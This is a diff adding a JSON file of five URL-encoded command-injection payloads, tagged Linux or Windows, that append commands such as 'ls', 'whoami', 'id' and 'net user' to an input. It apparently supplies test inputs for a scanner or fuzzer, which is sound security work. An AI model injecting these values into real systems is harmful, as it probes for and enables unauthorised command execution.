@@ -1,0 +1,22 @@
+[
+    {
+        "type": "Linux",
+        "payload": "%3Bls"
+    },
+    {
+        "type": "Linux",
+        "payload": "%26%26%20whoami"
+    },
+    {
+        "type": "Linux",
+        "payload": "%60id%60"
+    },
+    {
+        "type": "Windows",
+        "payload": "%26%20whoami"
+    },
+    {
+        "type": "Windows",
+        "payload": "%7C%20net%20user"
+    }
+]
